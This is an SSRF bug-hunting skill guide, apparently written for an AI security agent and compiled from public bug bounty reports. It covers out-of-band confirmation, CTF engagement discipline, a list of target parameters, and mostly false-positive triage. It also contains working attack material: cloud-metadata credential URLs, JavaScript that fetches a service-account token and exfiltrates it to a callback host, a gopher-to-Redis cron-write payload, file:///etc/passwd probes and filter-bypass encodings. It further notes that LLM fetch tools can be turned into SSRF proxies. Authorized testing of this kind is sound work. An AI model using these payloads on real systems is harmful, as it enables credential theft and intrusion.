---
name: hunt-ssrf
description: Hunting skill for ssrf vulnerabilities. Built from 15 public bug bounty reports including AWS metadata SSRF (HackerOne $25k Analytics PDF, Shopify Exchange $25k, Capital One 106M-record breach, Dropbox/HelloSign $4,913), GCP metadata SSRF (Snapchat $4k), Azure IMDS SSRF (Azure DevOps $15k chain, ChatGPT Custom Actions MSRC), DNS rebinding SSRF (Concrete CMS, GitLab UrlBlocker), gopher-protocol-to-Redis-RCE (Yahoo Mail $15k), link-preview SSRF (Reddit Matrix $6k), and headless-browser PDF-generator SSRF chains. Use when hunting SSRF on any target — OOB Collaborator confirmation mandatory for blind cases.
sources: github, hackerone_public, portswigger_research, binarysecurity_research
report_count: 15
---

## Crown Jewel Targets

SSRF is highest-value when the target runs on cloud infrastructure (AWS, GCP, Azure) where metadata services expose credentials, or when the server sits inside a complex internal network (Kubernetes clusters, microservice meshes, internal APIs). Priority targets:

- **Cloud-hosted SaaS products** (GCP metadata at `169.254.169.254` or `metadata.google.internal`, AWS IMDSv1)
- **Kubernetes/orchestration platforms** — aggregated API servers, metrics-server, kubelet endpoints expose privileged cluster operations
- **Internal developer tooling** — CI/CD, workflow orchestration (Flyte, Argo), admin panels not exposed externally
- **Link preview / URL fetching features** — Reddit-style preview APIs, Slack-style unfurling, media processors
- **Dataset/file import pipelines** — anything that fetches remote URLs on behalf of a user
- **Enterprise self-hosted software** (GitHub Enterprise, GitLab) — SSRF frequently chains to RCE via internal services

Payouts are highest when SSRF reaches: cloud credentials → account takeover, internal admin APIs → data exfil, or chains to RCE.

---

## OOB-Or-It-Didn't-Happen Gate (Read First)

**Claims of blind SSRF require an out-of-band (OOB) confirmation. Always. No exceptions.**

OOB means: a Burp Collaborator domain, an `interactsh-client` listener, a canarytoken, or any DNS+HTTP receiver you control that confirms the server actually made an outbound network connection on your behalf.

### What is NOT confirmation of SSRF

- The server **echoing your URL back in an error message**. Example: `"The Web application at http://evil.example.com/x could not be found"` — this is the server formatting your input into an error string, NOT making an outbound HTTP request. The error came from string formatting, not from network failure.
- The server returning a different status code for an external URL vs `localhost`. Different error responses can come from URL-scheme validators, not from actual fetching.
- A delayed response when the URL is sent. Delay can come from DNS resolution attempts within the parser, not from completed HTTP fetches.

### What IS confirmation of SSRF

- A DNS lookup for your unique Collaborator subdomain appears in the OOB listener.
- An HTTP request to your Collaborator HTTP endpoint with the server's source IP and User-Agent.
- For SSRF in JavaScript-execution contexts (PDF renderers, headless browsers), a fetch from the server to your callback URL.

### Default workflow

1. **Plant the Collaborator subdomain first** (sub-tag it per sink: `dlsrcurl.<collab>`, `import.<collab>`, etc., so callbacks tell you which sink fired).
2. **Send the request** to the target endpoint.
3. **Wait 30–120 seconds**, then poll the OOB listener.
4. **Only after a confirmed callback** do you claim SSRF.
5. If zero callbacks across all sub-tagged sinks: SSRF claims must be retracted, even if error messages echo URLs.

**Step 0 — prove the listener works BEFORE you send a single probe.** A zero-callback run is
only evidence if you know the receiver would have logged a hit. Fire one request at a reserved
self-test subdomain from your own host, wait ~20 s, and confirm it appears in the log. If it does
not, you are measuring a broken receiver, not a clean target.
```bash
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest   # if absent
interactsh-client -v -o findings/oob_interactions.txt | tee findings/oob_console.log &
# read the payload domain from the banner, then:
curl -s "http://selftest1.<your-oob-domain>/x" -o /dev/null
sleep 20 && grep 'Received' findings/oob_interactions.txt      # self-test must be here
```
At the end, prove the zero the same way: every `Received DNS/HTTP` line in the file should carry
**your own** source IP. If the only interactions are your self-test, the negative is publishable —
and say that explicitly in the report ("listener sanity-checked, N tagged probes, 0 target
callbacks"). Distinguish that from "no callbacks were captured" (which proves nothing).

**One tagged probe per sink, and record the HTTP outcome next to it** (`ssrf_matrix.json`-style:
`tag, url, status, size, content-type, Location`). The status table is what lets you say *which*
sinks were genuinely exercised and which were blocked before the fetch step (a Cloudflare 403 is
an untested sink, not a negative — call that out separately rather than folding it into the zero).

**Lesson from a authorized engagement:** SharePoint's `/_layouts/15/download.aspx?SourceUrl=` returned 500 with the title `"The Web application at <attacker-URL> could not be found"`. Initial scan flagged this as SSRF (server clearly processed the URL). 38 Collaborator-tagged payloads across 12+ URL-accepting parameters yielded **zero DNS or HTTP interactions**. The "echo" was client-side error-string formatting; the server never made an outbound HTTP request. The path is actually an SP-internal `SPFile`/`SPWebApplication` resolver, not a generic URL fetcher. Reporting this as SSRF would have been N/A'd at triage.

---

## Operator cadence on CTF challenges (user directives)

CTF / challenge engagements run under DIFFERENT operator discipline than authorized red-team
engagements. When the user issues any of these directives, honor them immediately — they
override the default "keep probing" instinct:

- **"don't get stuck in a loop" / "don't blind-loop on dead ends"** → stop re-running the same
  failed vector. Summarize what is *proven* (works / blocked / firewalled) and surface the wall,
  then wait for direction. Do not re-spin brute loops on a confirmed dead end.
- **"try it manually" / "let me try" / "let me know if it's okay"** → hand over a clean working
  request + a findings map, then stand down. Don't keep hammering the target behind the user.
- **"send few requests to avoid block / timeout"** → when polling a flapping target, use a
  GENTLE poller: wait for the port, then fire only 2–3 quiet probes (banner read → one
  help/enum command → one bypass attempt), then STOP. No fuzz loops, no flood.

Gentle flapping-target poller skeleton (reusable):
1. Loop with a long gap (10s–120s) doing ONLY `socket.connect()` — no payload.
2. On first successful connect, send a TINY set of requests (banner, one help-style command,
   one encoded-IP/SSRF bypass probe) then close.
3. Log to a file; notify on completion. Do NOT retry-bomb or fuzz.

This keeps you under any rate/block threshold and respects the user's manual-takeover intent.
(For authorized red-team engagements where scope is "full engagement", see `redteam-mindset` —
different rules apply; these directives are CTF-context only.)

---

## Attack Surface Signals

### URL Patterns to Hunt
```
/api/*/preview
/api/*/fetch
/api/*/import
/api/*/webhook
/api/*/proxy
/api/*/render
/api/*/link
/api/*/screenshot
/api/*/export
/api/*/validate
?url=
?uri=
?endpoint=
?redirect=
?src=
?source=
?feed=
?host=
?target=
?dest=
?file=
?path=
?callback=
?image=
?load=
?fetch=
```

### JS Patterns (in client-side code)
```javascript
// Look for these in JS bundles
fetch(userInput)
axios.get(params.url)
XMLHttpRequest + variable URL
url: req.body.url
src: params.source
href: query.endpoint
```

### Response Header Signals
```
X-Forwarded-For headers echoed back
Server: internal-service
Via: 1.1 internal-proxy
X-Cache headers revealing internal hostnames
```

### Tech Stack Signals
- **Kubernetes** — any public-facing aggregated API, metrics endpoints
- **GCP** — any service fetching URLs that runs on Compute Engine/GKE
- **Node.js/Python** with URL-fetching libraries (`requests`, `node-fetch`, `axios`)
- **Headless browsers** (Puppeteer, PhantomJS) used for screenshots/PDF — extremely high value
- **XML/DSPL/CSV import features** — XXE-style SSRF vector
- **OAuth/webhook registration** endpoints

---

## Step-by-Step Hunting Methodology

1. **Map all URL-input parameters** across the target: spider JS files for fetch calls, check all API docs, look for file-import, link-preview, webhook, image-proxy, and redirect features.

2. **Set up an out-of-band detection server** using Burp Collaborator, interactsh, or `https://canarytokens.org` — you need a unique per-test DNS/HTTP callback domain.

3. **Send your callback URL as the parameter value first** (blind SSRF check before anything else):
   ```
   url=https://YOUR.interactsh.com/test
   ```
   Confirm the server makes an outbound connection. This proves execution before attempting internal targets.

4. **Test internal cloud metadata endpoints**:
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`

5. **Test localhost and common internal ports**:
   ```
   http://localhost/
   http://127.0.0.1:8080/
   http://127.0.0.1:6443/  (Kubernetes API)
   http://127.0.0.1:2379/  (etcd)
   http://127.0.0.1:9090/  (Prometheus)
   http://127.0.0.1:9200/  (Elasticsearch)
   ```

6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.

7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
   - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
   - Exfil via DNS: encode response data in subdomain of your callback domain

8. **Enumerate the internal network** using timing differences and error message variations:
   - Port scan via response time (`connection refused` vs timeout)
   - Check error messages for hostname/IP leakage

9. **Chain findings** — if you have SSRF to internal services, look for:
   - Unauthenticated admin endpoints
   - Redis, memcached (protocol smuggling)
   - Internal OAuth token endpoints
   - SSRF → CSRF → RCE (GitHub Enterprise pattern)

10. **Document the full chain** with screenshots of each hop before reporting.

---

## Payload & Detection Patterns

### Basic Out-of-Band Detection
```bash
# Using interactsh-client
interactsh-client -v

# Test parameter
curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"

# With common headers that might unlock SSRF
curl -s "https://target.com/api/fetch" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://YOUR_ID.oast.pro"}'
```

### Cloud Metadata Payloads
```bash
# GCP - requires Metadata-Flavor header (test if server adds it automatically)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/project/project-id

# AWS IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Localhost/Internal Port Payloads
```bash
# Kubernetes internals
http://127.0.0.1:6443/api/v1/namespaces
http://10.0.0.1:6443/api/v1/secrets
http://127.0.0.1:10250/pods          # kubelet
http://127.0.0.1:2379/v2/keys        # etcd

# Common internal services
http://127.0.0.1:6379/               # Redis (check for inline commands)
http://127.0.0.1:9200/_cat/indices   # Elasticsearch
http://127.0.0.1:5601/               # Kibana
http://127.0.0.1:8500/v1/catalog/services  # Consul
```

### Redirect-Based SSRF (when direct is blocked)
```python
# Simple Python redirect server
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), Redirect).serve_forever()
```

### JavaScript-Based SSRF (headless browser contexts)
```javascript
// Exfil via fetch
fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', {
  headers: {'Metadata-Flavor': 'Google'}
}).then(r=>r.text()).then(d=>{
  fetch('https://YOUR.callback.com/?d='+btoa(d))
})

// DNS exfil for blind contexts
var x = new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/');
x.send();
x.onload = function(){
  var img = new Image();
  img.src = 'https://'+btoa(x.responseText.substring(0,50))+'.YOUR.callback.com';
}
```

### Grep Patterns for Source Code Review
```bash
# Find URL fetch operations
grep -rE "(fetch|curl|urllib|requests\.get|http\.get|axios\.get)\s*\(" --include="*.py" --include="*.js" --include="*.go"

# Find URL parameters being passed to HTTP clients
grep -rE "(url|uri|endpoint|redirect|src|source)\s*=\s*req\.(query|body|params)" --include="*.js"

# Find redirect following
grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
```

### ffuf Parameter Discovery
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
  -fs 0 -mc all
```

---

## Common Root Causes

1. **"The user said it was safe"** — Developers trust user-supplied URLs for fetching remote resources (link previews, thumbnails, webhooks) without validating the destination. The feature is legitimate; the missing validation is the bug.

2. **Allowlist bypass via redirects** — Developers validate the initial URL against an allowlist but configure HTTP clients to follow redirects automatically. An attacker's server on the allowlist redirects to an internal address.

3. **Aggregated/proxy API trust** — Kubernetes-style architectures where an API aggregation layer blindly proxies 30x responses from registered extension servers. Compromising a single extension server gives SSRF into the core API.

4. **Server-side rendering without sandboxing** — Headless browser features (PDF generation, link preview screenshots) execute attacker-controlled JavaScript in a network-privileged context with access to metadata services.

5. **XML/DSPL/file parsers fetching external entities** — Import features that parse structured files (XML, DSPL, CSV with remote schemas) fetch attacker-controlled URLs, often with no URL validation at all.

6. **Internal hostname leakage via response differences** — Services return different error messages, timing, or response sizes for internal vs. external hosts, enabling blind enumeration even when content isn't returned.

7. **IMDSv1 still enabled** — Cloud deployments that haven't migrated to IMDSv2 (AWS) or haven't required the `Metadata-Flavor` header (GCP) allow unauthenticated credential access from any SSRF.

---

## Bypass Techniques

### Blocklist Bypasses (When `localhost`, `127.0.0.1`, `169.254.x.x` are blocked)

```
# IPv6 equivalents
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[::ffff:169.254.169.254]/

# Decimal/octal/hex encoding of IP
http://2130706433/          (127.0.0.1 decimal)
http://0x7f000001/          (127.0.0.1 hex)
http://0177.0.0.1/          (octal)
http://127.1/               (short form)
http://0/                   (resolves to 0.0.0.0)

# DNS rebinding - register a domain that resolves to internal IP after first check
# Use https://lock.cmpxchg8b.com/rebinder.html

# Subdomain pointing to internal IP
http://localtest.me/         (resolves to 127.0.0.1)
http://127.0.0.1.nip.io/
http://customer.attacker.com/ (A record → 192.168.1.1)

# URL parser confusion
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://[REDACTED_EMAIL]  (URL encoding)
http://evil.com\.127.0.0.1/   (backslash)

# Protocol confusion
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
sftp://attacker.com:11111/
ldap://127.0.0.1/

# Redirect chain bypass
https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/

# Case variation / URL encoding
http://Localhost/
http://[REDACTED_EMAIL]/
```

### Schema/Protocol Bypasses
```
# When only http/https allowed but implementation is loose
http://169.254.169.254:[REDACTED_EMAIL]/
//169.254.169.254/
```

### TOCTOU (Time-of-Check vs Time-of-Use)
- Validate URL → sleep → redirect to internal (race condition with DNS rebinding)
- Register a domain with 0-TTL, rotate DNS between validation and fetch calls

### When Response is Not Returned (Blind SSRF)
- Use DNS-only callbacks (data encoded in subdomain labels)
- Use timing differences for port scanning
- Use different HTTP methods (PUT/DELETE) to trigger distinct behaviors on internal services
- Chain with other bugs that leak response data (e.g., error messages, logs)

---

## Reflected SSRF & multi-container pivots

Some SSRF sinks are **fully reflected**: the endpoint returns the fetched response body
in its JSON (e.g. a webhook-delivery tester with a `response_preview` / `body` field).
When the body is echoed you get **read SSRF with no OOB listener required** — you can
read internal HTML/JSON directly. This was confirmed on a CTF "Partner Operations" webhook
tester (`POST /api/integrations/webhook/test`, `Authorization: Bearer <jwt>`, body
`{"url":...,"method":...,"headers":{}}`) that echoed the target response. Prioritise
finding the reflected body over planting a Collaborator callback for these sinks.

### Verified filter-bypass ranking (real "Private and loopback ... not permitted" string filter)
A filter that did a **literal hostname string check** was defeated by decimal encoding but
still blocked several classic tricks. Empirically confirmed outcomes:

- `http://2130706433:8084/admin` -> **502 Connection refused** (decimal `127.0.0.1` PASSED
  the string filter, server connected to loopback) -> BYPASS WORKS
- `http://0x7f000001/` / `http://0177.0.0.1/` / `http://127.1/` / `http://0/` -> same BYPASS
- `http://[::1]/`, `http://[::ffff:127.0.0.1]/`, `http://127.0.0.1.nip.io/`,
  `http://localtest.me/`, `http://evil.com@127.0.0.1/` -> **403 blocked** (filter caught these)
- `file:///etc/passwd` -> request errored (`status: null`) -> urlopen-based testers usually
  reject non-http schemes; don't waste time on `file://`/`gopher://` unless the sink is a
  raw `requests`/`curl` call.

Takeaway: when a **literal-string loopback filter** is in play, **try decimal/hex/octal IP
encoding FIRST** — it survives the string check while IPv6 / domain / `@` tricks get caught.

### Pitfall: loopback "Connection refused" != service down
If decimal-IP loopback returns `502 Connection refused`, the target is on a **separate
container/host**, not absent. The box may expose the same app on its PUBLIC IP, reachable
from the SSRF sink's network even though firewalled externally. Confirmed chain:
`http://2.29.10.21:8084/admin` (public IP) returned **302** and was reachable via SSRF,
whereas `http://2130706433:8084/admin` (loopback) returned `502 refused` — because the
webhook tester and the target portal run in different containers. **Always try the sink's
own public IP / hostname as an SSRF target**, not just loopback, when hunting internal
endpoints of a multi-service CTF box.

### Linked multi-challenge CTF pivots
On CTF boxes where several challenges share one host (each a different service/port),
SSRF from one challenge's webhook/url-fetch sink is frequently the intended path to reach
ANOTHER challenge's firewalled internal endpoint (e.g. an `/admin` panel Disallowed in
robots.txt). Map every listening port first, then probe each sink against the others'
internal paths. See `references/asterveil-ssrf-chain.md` for a full worked repro.

- `references/asterveil-ssrf-chain.md` — full worked repro: reflected webhook tester,
  decimal-IP loopback-filter bypass, public-IP pivot past container isolation, HS256 JWT,
  and the `/admin` 302 dead-end + next leads.
- `references/ably-ssrf-notes.md` — ably.com SSRF hunt summary: endpoint-by-endpoint triage,
  CVE-2022-41697 false-positive analysis on Ghost CMS, Next.js `/_next/image` allowlist check,
  and cloud metadata / S3 bucket test results.
- `references/blackglass-ctf7-chain.md` — CTF7 Blackglass: reflected webhook tester (decimal-IP
  gateway bypass, no worker egress), Flask LFI `isfile`+substring filter on 5004 that locks
  `/proc/self/environ`, and the BrokerLink JWT (signature unverified yet reviewer role server-side /
  unforgeable) — confirms "alg:none honored" ≠ exploitable when the role source is unforgeable.
- `references/blackglass-rawtcp-ssrf.md` — CTF7 **Blackglass** (BI{...}, 600pt WEB/Hard, Asterveil-partner
  raw-TCP SSRF): service is nc-not-http on 2.29.10.21:8082 (flapping), Hint 1 = URL-validation≠network-lib
  host-encoding SSRF bypass, Hint 2 = internal API docs + hidden routes needing source inspection;
  includes the gentle-poller skeleton and the command-protocol discovery plan.

### Pitfall: internal-portal cookie wall
When the SSRF pivot reaches an **authenticated internal portal** (e.g. an Express/Flask `/login` → `/dashboard` behind a session cookie), the reflected webhook tester usually returns **only the response body** — no `Set-Cookie`, no redirect headers. You can POST valid creds + CSRF `_token`, but cannot extract or persist the session cookie, so `/dashboard` stays 302/401. Mitigations to try before declaring it a dead end:
- **Open / self-service endpoints:** probe `/register`, `/forgot-password`, `/api/me`, `/api/session`, `/setup`, `/api/flag`. These sometimes leak the flag or a token in the body *without* needing the session cookie.
- **robots.txt on the internal portal** often reveals protected route names (`Disallow: /admin`) and confirms what to fuzz.
- **Same-call redirect follow:** if the worker's HTTP client follows the login 302 within one call, the reflected `response_preview` may already be the post-login dashboard. Test by POSTing valid creds and inspecting whether the body is the authed page.
- **Pivot elsewhere:** if the env/flag lives in a *different* internal service (a file reader, a `/proc/self/environ` sink, a `/read?path=` endpoint) reachable via the same SSRF, go there instead of fighting the portal cookie.

### Subnet-discovery workflow (multi-service CTF boxes)
CTF boxes frequently colocate several challenges as separate services/ports on one host. Decimal/hex-encode the **gateway** (Docker `172.16.x.1` → e.g. `2886795xxx`) to defeat a loopback/string filter, then:
1. **SSRF-portscan the gateway** across a curated list (21,22,80,3000,5000,8000,8080–9090, etc.) — use open-vs-filtered (status vs `Connection refused`/timeout) to separate listening from firewalled.
2. **Re-SSRf each open port's interesting paths** (`/login`, `/admin`, `/api`, `/read?path=`, `/flag`) — each internal service may be its own challenge and a different link in the chain.
3. **Try the target's PUBLIC IP too**, not just loopback — containers in the same Docker network often expose the same app on the gateway IP, reachable from the SSRF sink even when loopback is refused (see the `502 refused` pitfall above).

### Pitfall: WordPress oEmbed is NOT a generic SSRF
WordPress's `/wp-json/oembed/1.0/embed?url=` endpoint fetches oEmbed provider URLs, but only for **whitelisted providers** (YouTube, Vimeo, Twitter, etc.). Sending `http://169.254.169.254/` returns `404 oembed_invalid_url` — the URL is parsed for format but never fetched unless it matches a known oEmbed provider pattern. This is NOT SSRF. Additionally, the oEmbed endpoint itself is often behind SG Captcha, making blind testing impossible without a bypass cookie.

Also, when the WordPress `wpSGCacheBypass=1` cookie is active, oEmbed accepts the URL parameter without SG Captcha challenge — but still validates against the provider whitelist.

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Can you retrieve a response proving internal network access? (Show the metadata token, internal API response, or confirmed DNS callback)
   - If blind: can you demonstrate port differentiation or confirmed OOB callback tied to a specific internal address?
   - "The server makes a request" alone is insufficient — show *where* it goes and *what comes back*.

### Gate 0b: CMS Platform Endpoint Triage (False-Positive Prevention)

When hunting SSRF on targets running known CMS/admin platforms, **manually verify every Nuclei finding** against the actual endpoint before claiming SSRF:

- **Ghost `/ghost/api/admin/session` (CVE-2022-41697):** GET returns 404 "Resource not found"; POST returns 403 "Access Denied" with `{"errors":[...]}`. This is proper server-side auth rejection, NOT metadata-fetch behavior. Nuclei's HTTP probe matches the status code pattern (session endpoint exists) but does NOT confirm the endpoint actually fetches external URLs.
- **Metabase `/api/database`, `/api/setting`, `/api/user`:** All return 401 without valid session cookie. Auth-gated endpoints, not open URL-fetchers.
- **Rule of thumb:** If the endpoint returns a structured JSON error (`{"errors":[...]}`) or a plain-text "Access Denied"/"Forbidden" — that's server-side auth, NOT SSRF. SSRF would return a DNS/HTTP interaction on your collaborator. Retract the claim.

**Quick triage checklist for CMS endpoints flagged by Nuclei:**
1. Manually GET the endpoint — does it return 404 or a structured error? → False positive.
2. POST to it with `{"url": "https://your.collab.id"}` — does the server make an outbound connection? → True positive only if OOB confirms.
3. If no URL parameter or fetch parameter exists in the endpoint — the Nuclei finding is matching a known path pattern, not actual behavior.

## Cloud-Hosted SaaS SSRF Surface

### Ably.com Case Study (Ghost + Metabase + Next.js on Heroku/Vercel)
When hunting SSRF on cloud-hosted SaaS targets, focus on:

1. **Link preview / webhook features** — check for `/api/*/preview`, `/api/*/webhook`, `/api/*/fetch`, `/api/*/import`, `/api/*/proxy`, `/api/*/render`
2. **Headless browser features** — PDF generation, screenshot services, email rendering
3. **File import pipelines** — dataset/file import that fetches remote URLs
4. **Next.js image optimization** — `/_next/image?url=` requires `remotePatterns` allowlist; non-allowlisted URLs return HTTP 400 (not exploitable if allowlist is configured)
5. **Cloud metadata endpoints** — test `http://169.254.169.254/`, `http://metadata.google.internal/`, `http://169.254.169.254/metadata/instance`

- **Key finding from ably.com:** Most URL-fetching parameters (`/api/notice?url=`, `/api/token?url=`) were rate-limited by Cloudflare (403), and the Next.js `/_next/image` was properly allowlisted. No SSRF was found. See `references/ably-ssrf-notes.md` for the full endpoint-by-endpoint triage.

2. **What does the victim LOSE?**
   - Cloud credentials (IAM tokens) → full cloud account compromise?
   - Internal service data (user PII, secrets, API keys)?
   - Ability to pivot to RCE via internal admin service?
   - If the answer is only "the server fetches my URL," severity is low — quantify the actual reachable blast radius.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable endpoint still live and the parameter still present?
   - Does your callback server show the hit reliably (not intermittently)?
   - Can a second person follow your steps without prior knowledge and get the same result?
   - If reproduction requires specific timing, tokens, or luck — resolve the flakiness before submitting.

---

## Real Impact Examples

### Scenario A: Cloud Credential Exfiltration via Link Preview (Snapchat/GCP Pattern)
A public-facing "link preview" API accepted a `url` parameter and fetched the target server-side to generate thumbnail content. The feature ran on GCP Compute Engine with IMDSv1 enabled and no `Metadata-Flavor` header enforcement on the server side. By supplying `url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, the attacker received a valid OAuth2 access token for the instance's service account. The token granted access to internal GCP project resources including storage buckets containing user data. The attacker used JavaScript execution within a headless rendering context to exfiltrate the token via DNS-encoded subdomains, bypassing response body restrictions.

### Scenario B: Kubernetes API Compromise via Hijacked Aggregated Server (Kubernetes Pattern)
An attacker who could register a Kubernetes API extension server (metrics-server equivalent) returned `302 Location: http://127.0.0.1:6443/api/v1/secrets` responses to the aggregation layer. Because the aggregation proxy followed redirects automatically without re-validating the destination against the internal network blocklist, the redirect caused the aggregation layer itself (running with elevated cluster credentials) to fetch internal Kubernetes API secrets and return them in the response. This effectively allowed an attacker with limited API registration privileges to escalate to full cluster secret read access — a critical privilege escalation via SSRF chained through trusted infrastructure components.

---

## Disclosed Report Citations (Backfill +6 — 2018-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Cloud-metadata SSRFs across all three providers, DNS rebinding, gopher-to-Redis-RCE, link-preview SSRF, and headless-browser/PDF-generator chains are all represented.

3. **HackerOne — SSRF in Analytics Reports (PDF generator → AWS metadata)** ([H1 #2262382](https://hackerone.com/reports/2262382) · [Writeup](https://osintteam.blog/25-000-ssrf-in-hackerones-analytics-reports-b9a5b3aa3d6e))
    - Subclass: headless-browser SSRF (PDF generator) → AWS metadata SSRF (IMDSv1)
    - Payload: injected `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` into a template element rendered server-side; backend Ruby loop rendered the untrusted template HTML into PDF, reflecting IMDS response inside the rendered PDF / error message
    - Root cause: unsanitised user-controlled template fragment reflected in PDF rendering pipeline; no IMDSv2 enforcement
    - Year: 2023 — **$25,000** (CVSS 10.0 Critical)

4. **Shopify Exchange — SSRF in screenshot service → GCP metadata → container root** ([H1 #341876](https://hackerone.com/reports/341876))
    - Subclass: GCP metadata SSRF → SSRF-to-RCE chain
    - Payload: created store on partners.shopify.com, edited `password.liquid` template to embed a request to `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`, then triggered the Exchange screenshotting service to render the template server-side
    - Root cause: screenshotter fetched user-controlled template with no metadata-host blocklist and no metadata-concealment proxy
    - Year: 2018 — **$25,000** (canonical headless-browser → metadata)

5. **Concrete CMS — SSRF mitigation bypass via DNS rebinding → AWS IAM keys** ([H1 #1369312](https://hackerone.com/reports/1369312))
    - Subclass: DNS rebinding SSRF → AWS metadata SSRF (IMDSv1)
    - Payload: file-upload-from-URL feature; attacker DNS server alternated `A` records between `1.2.3.4` (public) and `169.254.169.254`; needed 2-3 requests to win the race between validation and fetch; final request retrieved IAM role credentials
    - Root cause: validated hostname by resolving once; download path re-resolved DNS without pinning the validated IP
    - Year: 2021 — fixed in 8.5.7 / 9.0.1

6. **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** ([Writeup](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530))
    - Subclass: gopher protocol abuse → Redis SSRF → SSRF-to-RCE chain
    - Payload: blind SSRF in Yahoo Mail backend reached via `gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall...SET stuff /var/spool/cron/root...BGSAVE` — wrote a cron via Redis to get command execution
    - Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on default port; SSRF target accepted 302 redirect from attacker host to `gopher://`
    - Year: 2020 — **$15,000**

7. **Reddit Matrix — Blind SSRF in `preview_url` API** ([H1 #1960765](https://hackerone.com/reports/1960765))
    - Subclass: link-preview SSRF (blind, internal port-scan via timing/response codes)
    - Payload: `GET https://matrix.redditspace.com/_matrix/media/r0/preview_url/?url=http://10.0.0.0:80/` — varied internal IPs/ports; service names and IPs leaked through response differences before the fix
    - Root cause: link-preview fetcher did not reject RFC1918 / link-local destinations; allowlist-by-scheme only
    - Year: 2023 — **$6,000**

8. **Azure DevOps — SSRF in Service Hooks + DNS rebinding bypass in endpointproxy** ([Binary Security writeup](https://www.binarysecurity.no/posts/2025/01/finding-ssrfs-in-devops))
    - Subclass: webhook URL field SSRF + DNS rebinding SSRF → Azure IMDS / managed identity
    - Payload: configured service-hook webhook URL or `endpointproxy` URL parameter to attacker rebinding host; second resolution returned `169.254.169.254`; chained CRLF injection to set required `Metadata: true` header for Azure IMDS
    - Root cause: validation-then-fetch with separate DNS lookups; CRLF in URL path injected headers needed by Azure IMDS
    - Year: 2023-2024 — **$15,000 total** across 3 reports

---

## Related Skills & Chains

- **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
- **`hunt-llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
- **`hunt-rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
- **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
- **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
- **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.
